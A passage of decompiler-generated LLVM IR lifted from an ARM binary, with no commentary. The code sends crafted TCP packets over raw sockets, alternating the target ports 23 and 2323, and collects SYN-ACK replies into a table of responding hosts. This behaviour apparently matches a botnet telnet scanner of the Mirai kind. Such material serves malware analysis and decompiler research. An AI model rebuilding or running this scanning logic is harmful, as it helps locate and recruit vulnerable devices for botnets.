  %v8_10f70 = icmp eq i32 %v1_10e5c, 214
  store i1 %v8_10f70, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_10f70, label %bb308, label %dec_label_pc_10f80

.thread37:                                        ; preds = %dec_label_pc_10f6c
  store i32 1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10e58

bb308:                                            ; preds = %bb307
  store i32 1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10e58

dec_label_pc_10f80:                               ; preds = %bb307
  store i32 0, i32* @r4, align 4
  %v5_10f8c = call i32 @llvm.bswap.i32(i32 %v0_10e58)
  store i32 %v5_10f8c, i32* %r3.global-to-local, align 4
  %tmp309 = and i32 %v0_10e58, 65280
  %tmp310 = call i32 @llvm.bswap.i32(i32 %tmp309)
  %tmp311 = and i32 %v0_10e58, 16711680
  %tmp312 = call i32 @llvm.bswap.i32(i32 %tmp311)
  %v3_10f98 = mul nuw i32 %v3_10e78, 16777216
  %v3_10f9c = udiv i32 %tmp310, 256
  %v4_10fa0 = mul nuw nsw i32 %tmp312, 256
  %tmp313 = and i32 %v0_10e58, 32768
  %v3_10fa4 = icmp ne i32 %tmp313, 0
  store i1 %v3_10fa4, i1* %cpsr_c.global-to-local, align 1
  %v4_10fa4 = udiv i32 %v5_10f8c, 16777216
  store i32 ptrtoint (i32* @global_var_1c1e8.224 to i32), i32* @r0, align 4
  %v5_10fa4 = or i32 %v4_10fa4, %v3_10f98
  %v5_10fa0 = or i32 %v5_10fa4, %v4_10fa0
  %v2_10fac = or i32 %v5_10fa0, %v3_10f9c
  store i32 %v2_10fac, i32* %r2.global-to-local, align 4
  %v4_10fb0 = trunc i32 %v4_10fa4 to i8
  store i8 %v4_10fb0, i8* @global_var_1c1f8.305, align 4
  store i32 20, i32* %r1.global-to-local, align 4
  store i8 0, i8* bitcast (i32* @global_var_1c1f2.306 to i8*), align 4
  store i8 0, i8* bitcast (i32* @global_var_1c1f3.307 to i8*), align 4
  %v2_10fc0 = call i32 @function_f188(i32 ptrtoint (i32* @global_var_1c1e8.224 to i32), i32 20)
  store i32 ptrtoint (i32* @global_var_1c1e8.224 to i32), i32* %ip.global-to-local, align 4
  %sext11 = mul i32 %v2_10fc0, 16777216
  %v1_10fc8 = sdiv i32 %sext11, 16777216
  store i32 %v1_10fc8, i32* %r3.global-to-local, align 4
  %v4_10fcc = ashr i32 %sext11, 31
  store i32 %v4_10fcc, i32* %r2.global-to-local, align 4
  %v1_10fd0 = trunc i32 %v1_10fc8 to i8
  store i8 %v1_10fd0, i8* bitcast (i32* @global_var_1c1f2.306 to i8*), align 4
  %v1_10fd4 = trunc i32 %v4_10fcc to i8
  store i8 %v1_10fd4, i8* bitcast (i32* @global_var_1c1f3.307 to i8*), align 4
  %v3_10fd8 = load i32, i32* %stack_var_-48, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v2_10fe0 = srem i32 %v3_10fd8, 10
  store i32 %v2_10fe0, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10fe4 = icmp eq i32 %v2_10fe0, 0
  store i1 %v2_10fe4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10fe4, label %.thread218, label %bb314

.thread218:                                       ; preds = %dec_label_pc_10f80
  store i32 ptrtoint (i32* @global_var_1c1fc.228 to i32), i32* @lr, align 4
  br label %.thread47.thread90

bb314:                                            ; preds = %dec_label_pc_10f80
  store i32 ptrtoint (i32* @global_var_1c1fc.228 to i32), i32* %r0.global-to-local, align 4
  store i32 23, i32* %r3.global-to-local, align 4
  %v1_10ff4 = load i32, i32* @r4, align 4
  %v2_10ff4 = trunc i32 %v1_10ff4 to i8
  store i8 %v2_10ff4, i8* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1c1fc.228 to i32), i32 2) to i8*), align 2
  %v0_10ff8.pr.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_10ff8.pr.pre, label %.thread47.thread90, label %.thread44

.thread44:                                        ; preds = %bb314
  %v1_10ff8 = load i32, i32* %r3.global-to-local, align 4
  %v2_10ff8 = trunc i32 %v1_10ff8 to i8
  %v3_10ff8 = load i32, i32* %r0.global-to-local, align 4
  %v4_10ff8 = add i32 %v3_10ff8, 3
  %v5_10ff8 = inttoptr i32 %v4_10ff8 to i8*
  store i8 %v2_10ff8, i8* %v5_10ff8, align 1
  %v0_11000.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  store i32 ptrtoint (i32* @global_var_1c1e8.224 to i32), i32* %r0.global-to-local, align 4
  br i1 %v0_11000.pr.pr, label %.thread50, label %.thread52

.thread47.thread90:                               ; preds = %bb314, %.thread218
  store i32 ptrtoint (i32* @global_var_1c1e8.224 to i32), i32* %r0.global-to-local, align 4
  br label %.thread50

.thread50:                                        ; preds = %.thread44, %.thread47.thread90
  store i32 9, i32* %r3.global-to-local, align 4
  store i32 19, i32* %r2.global-to-local, align 4
  %v3_11008 = load i32, i32* @lr, align 4
  %v4_11008 = add i32 %v3_11008, 2
  %v5_11008 = inttoptr i32 %v4_11008 to i8*
  store i8 9, i8* %v5_11008, align 1
  %v0_1100c.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1100c.pr.pr, label %bb315, label %.thread52

bb315:                                            ; preds = %.thread50
  %v1_1100c = load i32, i32* %r2.global-to-local, align 4
  %v2_1100c = trunc i32 %v1_1100c to i8
  %v3_1100c = load i32, i32* @lr, align 4
  %v4_1100c = add i32 %v3_1100c, 3
  %v5_1100c = inttoptr i32 %v4_1100c to i8*
  store i8 %v2_1100c, i8* %v5_1100c, align 1
  br label %.thread52

.thread52:                                        ; preds = %.thread44, %.thread50, %bb315
  %v3_11010 = load i8, i8* @global_var_1c1f8.305, align 1
  %v4_11010 = sext i8 %v3_11010 to i32
  store i32 %v4_11010, i32* %ip.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1c1fc.228 to i32), i32* %lr.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1c1fc.228 to i32), i32* @r1, align 4
  store i8 %v3_11010, i8* @global_var_1c200.308, align 4
  store i32 5120, i32* %r2.global-to-local, align 4
  store i32 20, i32* %r3.global-to-local, align 4
  %v0_11028 = load i32, i32* %sl.global-to-local, align 4
  %v1_11028 = trunc i32 %v0_11028 to i8
  store i8 %v1_11028, i8* bitcast (i32* @global_var_1c20c.309 to i8*), align 4
  store i8 %v1_11028, i8* bitcast (i32* @global_var_1c20d.310 to i8*), align 4
  %v4_11030 = call i32 @function_f1e4(i32 ptrtoint (i32* @global_var_1c1e8.224 to i32), i32 ptrtoint (i32* @global_var_1c1fc.228 to i32), i32 5120, i32 20)
  %sext = mul i32 %v4_11030, 16777216
  %v1_11038 = sdiv i32 %sext, 16777216
  %v3_11040 = ashr i32 %sext, 31
  %v2_11044 = load i32, i32* @global_var_1c1fc.228, align 4
  %v1_1104c = trunc i32 %v3_11040 to i8
  store i8 %v1_1104c, i8* bitcast (i32* @global_var_1c20d.310 to i8*), align 4
  store i32 2, i32* %stack_var_-92, align 4
  %v3_11060 = load i8, i8* @global_var_1c1f8.305, align 1
  %v4_11060 = sext i8 %v3_11060 to i32
  store i32 %v4_11060, i32* %r4.global-to-local, align 4
  %v2_11064 = load i32, i32* @global_var_1c238.222, align 4
  store i32 %v2_11064, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1c1fc.228 to i32), i32* %ip.global-to-local, align 4
  %v1_11074 = and i32 %v2_11044, 8388608
  %v2_11074 = icmp ne i32 %v1_11074, 0
  store i1 %v2_11074, i1* %cpsr_c.global-to-local, align 1
  store i32 ptrtoint (i32* @global_var_1c1e8.224 to i32), i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 40, i32* %r2.global-to-local, align 4
  %v1_11088 = trunc i32 %v1_11038 to i8
  store i8 %v1_11088, i8* bitcast (i32* @global_var_1c20c.309 to i8*), align 4
  store i32 %v2_11090, i32* %lr.global-to-local, align 4
  %v9_110a0 = call i32 @sendto(i32 %v2_11064, i32* nonnull @global_var_1c1e8.224, i32 40, i32 16384, %sockaddr* %tmp287, i32 16)
  store i32 %v9_110a0, i32* %r0.global-to-local, align 4
  %v3_110a4 = load i32, i32* %stack_var_-48, align 4
  %v1_110a8 = add i32 %v3_110a4, 1
  store i32 %v1_110a8, i32* %r3.global-to-local, align 4
  %v3_110ac = icmp ugt i32 %v1_110a8, 383
  store i1 %v3_110ac, i1* %cpsr_c.global-to-local, align 1
  %v8_110ac = icmp eq i32 %v1_110a8, 384
  store i1 %v8_110ac, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_110a8, i32* %stack_var_-48, align 4
  %v5_110b4 = icmp slt i32 %v1_110a8, 384
  br i1 %v5_110b4, label %.thread52.dec_label_pc_10e28_crit_edge, label %dec_label_pc_110b8

.thread52.dec_label_pc_10e28_crit_edge:           ; preds = %.thread52
  %v0_10e28.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_10e28

dec_label_pc_110b8:                               ; preds = %.thread52
  %v0_110b8 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_110b8, i32* @fp, align 4
  br label %dec_label_pc_110bc

dec_label_pc_110bc:                               ; preds = %dec_label_pc_10e0c, %dec_label_pc_110b8
  %v0_110bc = call i32* @__errno_location()
  %v2_110bc = ptrtoint i32* %v0_110bc to i32
  store i32 %v2_110bc, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  store i32 %v2_110bc, i32* @sb, align 4
  br label %dec_label_pc_110c8

dec_label_pc_110c8:                               ; preds = %dec_label_pc_111a4, %dec_label_pc_1119c, %dec_label_pc_11194, %dec_label_pc_11160, %dec_label_pc_11150, %dec_label_pc_1112c, %dec_label_pc_11114, %dec_label_pc_1118c, %dec_label_pc_1117c, %dec_label_pc_1110c, %dec_label_pc_11244, %dec_label_pc_110bc
  %v1_110cc = phi i32 [ %v2_110bc, %dec_label_pc_110bc ], [ %v1_110cc.pre.pre, %dec_label_pc_11244 ], [ %v0_11100, %dec_label_pc_1110c ], [ %v0_11100, %dec_label_pc_1117c ], [ %v0_11100, %dec_label_pc_1118c ], [ %v0_11100, %dec_label_pc_11114 ], [ %v0_11100, %dec_label_pc_1112c ], [ %v0_11100, %dec_label_pc_11150 ], [ %v0_11100, %dec_label_pc_11160 ], [ %v0_11100, %dec_label_pc_11194 ], [ %v0_11100, %dec_label_pc_1119c ], [ %v0_11100, %dec_label_pc_111a4 ]
  %v2_110cc = inttoptr i32 %v1_110cc to i32*
  store i32 0, i32* %v2_110cc, align 4
  %v2_110d8 = load i32, i32* @global_var_1c238.222, align 4
  store i32 %v2_110d8, i32* %r0.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 1514, i32* %r2.global-to-local, align 4
  store i32 %v2_10dfc, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v10_110f4 = call i32 @recvfrom(i32 %v2_110d8, i32* nonnull %stack_var_-1862, i32 1514, i32 16384, %sockaddr* null, i32* null)
  store i32 %v10_110f4, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_110f8 = icmp eq i32 %v10_110f4, 0
  store i1 %v2_110f8, i1* %cpsr_z.global-to-local, align 1
  %tmp316 = icmp slt i32 %v10_110f4, 1
  br i1 %tmp316, label %dec_label_pc_11278, label %dec_label_pc_11100

dec_label_pc_11100:                               ; preds = %dec_label_pc_110c8
  %v0_11100 = load i32, i32* @sb, align 4
  %v1_11100 = inttoptr i32 %v0_11100 to i32*
  %v2_11100 = load i32, i32* %v1_11100, align 4
  store i32 %v2_11100, i32* %r3.global-to-local, align 4
  %v2_11104 = icmp ugt i32 %v2_11100, 10
  store i1 %v2_11104, i1* %cpsr_c.global-to-local, align 1
  %v7_11104 = icmp eq i32 %v2_11100, 11
  store i1 %v7_11104, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11104, label %dec_label_pc_11278, label %dec_label_pc_1110c

dec_label_pc_1110c:                               ; preds = %dec_label_pc_11100
  %v2_1110c = icmp ugt i32 %v10_110f4, 38
  store i1 %v2_1110c, i1* %cpsr_c.global-to-local, align 1
  %v7_1110c = icmp eq i32 %v10_110f4, 39
  store i1 %v7_1110c, i1* %cpsr_z.global-to-local, align 1
  %v2_11110 = xor i1 %v2_1110c, true
  %v3_11110 = or i1 %v7_1110c, %v2_11110
  br i1 %v3_11110, label %dec_label_pc_110c8, label %dec_label_pc_11114

dec_label_pc_11114:                               ; preds = %dec_label_pc_1110c
  store i32 %v2_10dfc, i32* %lr.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1c21c.135 to i32), i32* %r0.global-to-local, align 4
  %v3_1111c = load i32, i32* %v2_1111c, align 4
  store i32 %v3_1111c, i32* %r2.global-to-local, align 4
  %v2_11120 = load i32, i32* @global_var_1c21c.135, align 4
  store i32 %v2_11120, i32* %r3.global-to-local, align 4
  %v3_11124 = icmp uge i32 %v3_1111c, %v2_11120
  store i1 %v3_11124, i1* %cpsr_c.global-to-local, align 1
  %v9_11124 = icmp eq i32 %v3_1111c, %v2_11120
  store i1 %v9_11124, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_11124, label %dec_label_pc_1112c, label %dec_label_pc_110c8

dec_label_pc_1112c:                               ; preds = %dec_label_pc_11114
  %v3_1112c = load i8, i8* %v2_1112c, align 1
  %v4_1112c = zext i8 %v3_1112c to i32
  store i32 %v4_1112c, i32* %r3.global-to-local, align 4
  %v2_11130 = icmp ugt i8 %v3_1112c, 5
  store i1 %v2_11130, i1* %cpsr_c.global-to-local, align 1
  %v7_11130 = icmp eq i8 %v3_1112c, 6
  store i1 %v7_11130, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11130, label %dec_label_pc_11138, label %dec_label_pc_110c8

dec_label_pc_11138:                               ; preds = %dec_label_pc_1112c
  store i32 %v2_10e00, i32* %r1.global-to-local, align 4
  %v2_1113c = load i8, i8* %tmp286, align 4
  %v3_1113c = zext i8 %v2_1113c to i32
  store i32 %v3_1113c, i32* %r2.global-to-local, align 4
  %v3_11140 = load i8, i8* %v2_11140, align 1
  %v4_11140 = zext i8 %v3_11140 to i32
  store i32 %v4_11140, i32* %r3.global-to-local, align 4
  %v4_11144 = mul nuw nsw i32 %v4_11140, 256
  %v5_11144 = or i32 %v4_11144, %v3_1113c
  store i32 %v5_11144, i32* %r2.global-to-local, align 4
  %v2_11148 = icmp ugt i32 %v5_11144, 5887
  store i1 %v2_11148, i1* %cpsr_c.global-to-local, align 1
  %v7_11148 = icmp eq i32 %v5_11144, 5888
  store i1 %v7_11148, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11148, label %dec_label_pc_11160, label %dec_label_pc_11150

dec_label_pc_11150:                               ; preds = %dec_label_pc_11138
  store i32 4873, i32* %r3.global-to-local, align 4
  %v3_11158 = icmp ugt i32 %v5_11144, 4872
  store i1 %v3_11158, i1* %cpsr_c.global-to-local, align 1
  %v9_11158 = icmp eq i32 %v5_11144, 4873
  store i1 %v9_11158, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_11158, label %dec_label_pc_11160, label %dec_label_pc_110c8

dec_label_pc_11160:                               ; preds = %dec_label_pc_11150, %dec_label_pc_11138
  store i32 %v2_10e00, i32* %r2.global-to-local, align 4
  %v3_11164 = load i8, i8* %v2_11164, align 2
  %v4_11164 = zext i8 %v3_11164 to i32
  store i32 %v4_11164, i32* %r3.global-to-local, align 4
  %v3_11168 = load i8, i8* %v2_11168, align 1
  %v4_11168 = zext i8 %v3_11168 to i32
  store i32 %v4_11168, i32* %r2.global-to-local, align 4
  store i32 %v4_10b60, i32* %ip.global-to-local, align 4
  %v4_11170 = mul nuw nsw i32 %v4_11168, 256
  %v5_11170 = or i32 %v4_11170, %v4_11164
  store i32 %v5_11170, i32* %r3.global-to-local, align 4
  %v3_11174 = icmp uge i32 %v5_11170, %v4_10b60
  store i1 %v3_11174, i1* %cpsr_c.global-to-local, align 1
  %v9_11174 = icmp eq i32 %v5_11170, %v4_10b60
  store i1 %v9_11174, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_11174, label %dec_label_pc_1117c, label %dec_label_pc_110c8

dec_label_pc_1117c:                               ; preds = %dec_label_pc_11160
  store i32 %v2_10e00, i32* %lr.global-to-local, align 4
  %v3_11180 = load i8, i8* %v2_11180, align 1
  %v4_11180 = zext i8 %v3_11180 to i32
  store i32 %v4_11180, i32* %r3.global-to-local, align 4
  %v1_11184 = and i32 %v4_11180, 2
  %v2_11184 = icmp eq i32 %v1_11184, 0
  store i1 %v2_11184, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11184, label %dec_label_pc_110c8, label %dec_label_pc_1118c

dec_label_pc_1118c:                               ; preds = %dec_label_pc_1117c
  %v1_1118c = and i32 %v4_11180, 16
  %v2_1118c = icmp eq i32 %v1_1118c, 0
  store i1 %v2_1118c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1118c, label %dec_label_pc_110c8, label %dec_label_pc_11194

dec_label_pc_11194:                               ; preds = %dec_label_pc_1118c
  %v1_11194 = and i32 %v4_11180, 4
  %v2_11194 = icmp eq i32 %v1_11194, 0
  store i1 %v2_11194, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11194, label %dec_label_pc_1119c, label %dec_label_pc_110c8

dec_label_pc_1119c:                               ; preds = %dec_label_pc_11194
  %tmp469 = urem i8 %v3_11180, 2
  %v2_1119c = icmp eq i8 %tmp469, 0
  store i1 %v2_1119c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1119c, label %dec_label_pc_111a4, label %dec_label_pc_110c8

dec_label_pc_111a4:                               ; preds = %dec_label_pc_1119c
  %v3_111a4 = load i32, i32* %v2_111a4, align 4
  %v2_111c0 = call i32 @llvm.bswap.i32(i32 %v3_111a4)
  %v1_111c4 = add i32 %v2_111c0, -1
  %v1_111c8 = udiv i32 %v1_111c4, 256
  %v3_111cc = and i32 %v1_111c8, 65280
  %v1_111d0 = and i32 %v1_111c4, 65280
  store i32 %v1_111d0, i32* %r2.global-to-local, align 4
  %v3_111d4 = mul i32 %v1_111c4, 16777216
  %v4_111d8 = udiv i32 %v1_111c4, 16777216
  %v5_111d8 = or i32 %v3_111cc, %v4_111d8
  store i32 %v5_111d8, i32* %r1.global-to-local, align 4
  store i32 %v2_10dfc, i32* %r3.global-to-local, align 4
  %v4_111e0 = mul nuw nsw i32 %v1_111d0, 256
  %v5_111e0 = or i32 %v4_111e0, %v3_111d4
  store i32 %v5_111e0, i32* %r0.global-to-local, align 4
  %v3_111e4 = load i32, i32* %v2_111e4, align 4
  store i32 %v3_111e4, i32* %r2.global-to-local, align 4
  %v2_111e8 = call i32 @llvm.bswap.i32(i32 %v1_111c4)
  store i32 %v2_111e8, i32* %ip.global-to-local, align 4
  %v3_111ec = icmp uge i32 %v2_111e8, %v3_111e4
  store i1 %v3_111ec, i1* %cpsr_c.global-to-local, align 1
  %v9_111ec = icmp eq i32 %v2_111e8, %v3_111e4
  store i1 %v9_111ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_111ec, label %dec_label_pc_111f4, label %dec_label_pc_110c8

dec_label_pc_111f4:                               ; preds = %dec_label_pc_111a4
  %v0_111f4 = load i32, i32* @r4, align 4
  %v2_111f4 = icmp ugt i32 %v0_111f4, 254
  store i1 %v2_111f4, i1* %cpsr_c.global-to-local, align 1
  %v7_111f4 = icmp eq i32 %v0_111f4, 255
  store i1 %v7_111f4, i1* %cpsr_z.global-to-local, align 1
  %v8_111f8 = icmp sgt i32 %v0_111f4, 255
  br i1 %v8_111f8, label %dec_label_pc_11278, label %dec_label_pc_111fc

dec_label_pc_111fc:                               ; preds = %dec_label_pc_111f4
  store i32 ptrtoint (i32* @global_var_1c234.220 to i32), i32* %lr.global-to-local, align 4
  %v3_11200 = mul i32 %v0_111f4, 256
  store i32 %v3_11200, i32* %r2.global-to-local, align 4
  %v2_11204 = load i32, i32* @global_var_1c234.220, align 4
  store i32 %v2_11204, i32* %r1.global-to-local, align 4
  %v2_1120c = mul i32 %v0_111f4, 288
  store i32 %v2_1120c, i32* %r3.global-to-local, align 4
  %v2_11210 = add i32 %v2_11204, %v2_1120c
  store i32 %v2_11210, i32* @r0, align 4
  %v1_11214 = add i32 %v2_11210, 12
  %v2_11214 = inttoptr i32 %v1_11214 to i32*
  %v3_11214 = load i32, i32* %v2_11214, align 4
  store i32 %v3_11214, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11218 = icmp eq i32 %v3_11214, 0
  store i1 %v2_11218, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11218, label %dec_label_pc_11244, label %dec_label_pc_11224.preheader

dec_label_pc_11224.preheader:                     ; preds = %dec_label_pc_111fc
  %v2_1121c = add i32 %v2_11210, 288
  store i32 %v2_1121c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_11224

dec_label_pc_11224:                               ; preds = %dec_label_pc_11224.preheader, %dec_label_pc_11230
  %v0_11230 = phi i32 [ %v2_1121c, %dec_label_pc_11224.preheader ], [ %v1_1123c, %dec_label_pc_11230 ]
  %v0_11224 = phi i32 [ %v0_111f4, %dec_label_pc_11224.preheader ], [ %v1_11224, %dec_label_pc_11230 ]
  %v1_11224 = add i32 %v0_11224, 1
  store i32 %v1_11224, i32* @r4, align 4
  %v7_11228 = icmp eq i32 %v1_11224, 256
  br i1 %v7_11228, label %dec_label_pc_11278.loopexit, label %dec_label_pc_11230

dec_label_pc_11230:                               ; preds = %dec_label_pc_11224
  store i32 %v0_11230, i32* @r0, align 4
  %v1_11234 = add i32 %v0_11230, 12
  %v2_11234 = inttoptr i32 %v1_11234 to i32*
  %v3_11234 = load i32, i32* %v2_11234, align 4
  %v2_11238 = icmp eq i32 %v3_11234, 0
  %v1_1123c = add i32 %v0_11230, 288
  store i32 %v1_1123c, i32* %r3.global-to-local, align 4
  br i1 %v2_11238, label %dec_label_pc_11244.loopexit, label %dec_label_pc_11224

dec_label_pc_11244.loopexit:                      ; preds = %dec_label_pc_11230
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_11244

dec_label_pc_11244:                               ; preds = %dec_label_pc_11244.loopexit, %dec_label_pc_111fc
  %v1_11244 = phi i32 [ %v0_11230, %dec_label_pc_11244.loopexit ], [ %v2_11210, %dec_label_pc_111fc ]
  %v2_11244 = add i32 %v1_11244, 16
  %v3_11244 = inttoptr i32 %v2_11244 to i32*
  store i32 %v3_111e4, i32* %v3_11244, align 4
  store i32 %v2_10e00, i32* %r1.global-to-local, align 4
  %v2_1124c = load i32, i32* %stack_var_-1842, align 4
  store i32 %v2_1124c, i32* %r2.global-to-local, align 4
  %v1_11250 = and i32 %v2_1124c, 128
  %v2_11250 = icmp ne i32 %v1_11250, 0
  store i1 %v2_11250, i1* %cpsr_c.global-to-local, align 1
  %v3_11250 = sdiv i32 %v2_1124c, 256
  store i32 %v3_11250, i32* %r3.global-to-local, align 4
  %v1_11254 = trunc i32 %v3_11250 to i8
  %v2_11254 = load i32, i32* @r0, align 4
  %v3_11254 = add i32 %v2_11254, 21
  %v4_11254 = inttoptr i32 %v3_11254 to i8*
  store i8 %v1_11254, i8* %v4_11254, align 1
  %v0_11258 = load i32, i32* %r2.global-to-local, align 4
  %v1_11258 = trunc i32 %v0_11258 to i8
  %v2_11258 = load i32, i32* @r0, align 4
  %v3_11258 = add i32 %v2_11258, 20
  %v4_11258 = inttoptr i32 %v3_11258 to i8*
  store i8 %v1_11258, i8* %v4_11258, align 1
  %v0_1125c = call i32 @function_10744()
  store i32 %v0_1125c, i32* %r0.global-to-local, align 4
  %v1_110cc.pre.pre = load i32, i32* @sb, align 4
  br label %dec_label_pc_110c8

dec_label_pc_11264:                               ; preds = %dec_label_pc_10ab0
  store i32 ptrtoint (i32* @global_var_1c238.222 to i32), i32* %r2.global-to-local, align 4
  %v2_11268 = load i32, i32* @global_var_1c238.222, align 4
  store i32 %v2_11268, i32* %r0.global-to-local, align 4
  %v1_1126c = call i32 @close(i32 %v2_11268)
  store i32 %v1_1126c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11270

dec_label_pc_11270:                               ; preds = %dec_label_pc_10a88, %dec_label_pc_11264
  %v0_11270 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_11270, i32* %r0.global-to-local, align 4
  call void @exit(i32 %v0_11270)
  unreachable

dec_label_pc_11278.loopexit:                      ; preds = %dec_label_pc_11224
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_11278

dec_label_pc_11278:                               ; preds = %dec_label_pc_111f4, %dec_label_pc_11100, %dec_label_pc_110c8, %dec_label_pc_11278.loopexit
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 1664, i32* %ip.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v2_1128c416 = load i32, i32* @sp, align 4
  %v3_1128c417 = add i32 %v2_1128c416, 1664
  %v4_1128c418 = inttoptr i32 %v3_1128c417 to i32*
  store i32 0, i32* %v4_1128c418, align 4
  br label %dec_label_pc_11280.dec_label_pc_11280_crit_edge

dec_label_pc_11280.dec_label_pc_11280_crit_edge:  ; preds = %dec_label_pc_11278, %dec_label_pc_11280.dec_label_pc_11280_crit_edge
  %v0_11280.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_1128c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_11280 = add i32 %v0_11280.pre, 1664
  store i32 %v1_11280, i32* %ip.global-to-local, align 4
  %v1_11284 = add i32 %v0_11280.pre, 4
  store i32 %v1_11284, i32* %r3.global-to-local, align 4
  %v7_11288 = icmp eq i32 %v1_11284, 128
  %v2_1128c = load i32, i32* @sp, align 4
  %v3_1128c = add i32 %v2_1128c, %v1_11280
  %v4_1128c = inttoptr i32 %v3_1128c to i32*
  store i32 %v0_1128c.pre, i32* %v4_1128c, align 4
  br i1 %v7_11288, label %dec_label_pc_11294, label %dec_label_pc_11280.dec_label_pc_11280_crit_edge

dec_label_pc_11294:                               ; preds = %dec_label_pc_11280.dec_label_pc_11280_crit_edge
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v0_11294 = load i32, i32* %r2.global-to-local, align 4
  %v1_11298419 = add i32 %v0_11294, 1536
  store i32 %v1_11298419, i32* %lr.global-to-local, align 4
  %v1_1129c420 = add i32 %v0_11294, 4
  store i32 %v1_1129c420, i32* %r3.global-to-local, align 4
  %v7_112a0421 = icmp eq i32 %v1_1129c420, 128
  %v2_112a4422 = load i32, i32* @sp, align 4
  %v3_112a4423 = add i32 %v2_112a4422, %v1_11298419
  %v4_112a4424 = inttoptr i32 %v3_112a4423 to i32*
  store i32 %v0_11294, i32* %v4_112a4424, align 4
  br i1 %v7_112a0421, label %dec_label_pc_112ac, label %dec_label_pc_11298.dec_label_pc_11298_crit_edge

dec_label_pc_11298.dec_label_pc_11298_crit_edge:  ; preds = %dec_label_pc_11294, %dec_label_pc_11298.dec_label_pc_11298_crit_edge
  %v0_11298.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_112a4.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_11298 = add i32 %v0_11298.pre, 1536
  store i32 %v1_11298, i32* %lr.global-to-local, align 4
  %v1_1129c = add i32 %v0_11298.pre, 4
  store i32 %v1_1129c, i32* %r3.global-to-local, align 4
  %v7_112a0 = icmp eq i32 %v1_1129c, 128
  %v2_112a4 = load i32, i32* @sp, align 4
  %v3_112a4 = add i32 %v2_112a4, %v1_11298
  %v4_112a4 = inttoptr i32 %v3_112a4 to i32*
  store i32 %v0_112a4.pre, i32* %v4_112a4, align 4
  br i1 %v7_112a0, label %dec_label_pc_112ac, label %dec_label_pc_11298.dec_label_pc_11298_crit_edge

dec_label_pc_112ac:                               ; preds = %dec_label_pc_11298.dec_label_pc_11298_crit_edge, %dec_label_pc_11294
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v0_112ac = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_112ac, i32* @r6, align 4
  store i32 %v0_112ac, i32* @r5, align 4
  store i32 %v0_112ac, i32* @r7, align 4
  store i32 %v0_112ac, i32* %stack_var_-48, align 4
  br label %dec_label_pc_11328

dec_label_pc_112c0:                               ; preds = %dec_label_pc_11350, %dec_label_pc_11328
  %storemerge233 = phi i32 [ 30, %dec_label_pc_11328 ], [ 5, %dec_label_pc_11350 ]
  store i32 %storemerge233, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1c218.208 to i32), i32* %r2.global-to-local, align 4
  %v2_112c4 = load i32, i32* @global_var_1c218.208, align 4
  store i32 %v2_112c4, i32* %r3.global-to-local, align 4
  %v1_112c8 = add i32 %v2_1133c, 8
  %v2_112c8 = inttoptr i32 %v1_112c8 to i32*
  %v3_112c8 = load i32, i32* %v2_112c8, align 4
  store i32 %v3_112c8, i32* %r2.global-to-local, align 4
  %v2_112cc = sub i32 %v2_112c4, %v3_112c8
  store i32 %v2_112cc, i32* %r3.global-to-local, align 4
  %v3_112d0 = icmp uge i32 %v2_112cc, %storemerge233
  store i1 %v3_112d0, i1* %cpsr_c.global-to-local, align 1
  %v9_112d0 = icmp eq i32 %v2_112cc, %storemerge233
  store i1 %v9_112d0, i1* %cpsr_z.global-to-local, align 1
  %v2_112d4 = xor i1 %v9_112d0, true
